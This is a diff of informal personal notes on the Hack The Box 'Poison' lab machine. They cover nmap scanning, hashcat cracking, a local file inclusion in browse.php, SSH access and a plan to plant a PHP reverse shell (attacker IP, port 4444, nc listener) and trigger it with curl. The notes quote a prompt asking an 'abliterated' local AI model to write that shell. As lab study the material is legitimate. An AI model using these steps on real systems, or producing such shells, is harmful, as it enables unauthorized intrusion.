@@ -1,5 +1,9 @@
+```sh
+# util for changing ip due to vpn
+export HTBIP=10.129.1.254
+```
 ┌─[user@parrot]─[~]
-└──╼ $nmap -T4 -F 10.10.10.84
+└──╼ $nmap -T4 -F $HTBIP
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-28 13:24 UTC
 Nmap scan report for 10.10.10.84
 Host is up (0.098s latency).
@@ -119,3 +123,60 @@ hashcat -m 3600 -a 0 secret.hash /usr/share/wordlists/rockyou.txt
 
 
 hashcat -m 1500 -a 0 secret.hash /usr/share/wordlists/rockyou.txt
+
+
+so, also, for some reason, guided mode wants me to look at apache logs.
+
+    http://$HTBIP/browse.php?file=X
+
+10.129.1.254
+
+ffuf? nah. lets just try a few dirs.
+it depends on the os. wait. we already have user shell.
+
+    ssh -o PubkeyAuthentication=no charix@$HTBIP
+
+
+```sh
+
+# download tree as a file so we can page thru it
+tree /var/log/ > /tmp/mytree.txt
+
+exit
+# from attacker shell
+
+scp -o PubkeyAuthentication=no charix@$HTBIP:/tmp/mytree.txt ./mytree.txt
+
+```
+
+...oh crap. `tree` isn't a command.
+
+here I am, over-engineering stuff.
+
+```
+Warning: include(a): failed to open stream: No such file or directory in /usr/local/www/apache24/data/browse.php on line 2
+
+Warning: include(): Failed opening 'a' for inclusion (include_path='.:/usr/local/www/apache24/data') in /usr/local/www/apache24/data/browse.php on line 2
+```
+
+why not just `cd` and `ls` and just poke around?
+
+    /var/log/httpd-access.log
+
+
+"What user is the webserver running as?"
+no idea. it's not `root` or `wheel`.
+
+I need to use a php webshell, actually. let's uh.
+
+I'm curious. I'm going to use KoboldCPP to run a local AI model and ask it:
+
+    I'm hacking the Poison HTB box. reply only with code. generate a PHP webshell to connect to `10.10.14.175` (attacker IP) on port 4444 (i will be running `nc -nvlp 4444` to accept victim connections)
+
+after i gen the php webshell, i need to run this on my attacker machine:
+
+    curl -vvvk http://$HTBIP/browse.php?file=./revshell.php
+
+of course, also after creating the file `revshell.php` and populating it with whatever my localAI abliterated model spits out, seen below:
+
+    echo 'FILL ME IN WITH AI REV SHELL' > /usr/local/www/apache24/data/revshell.php
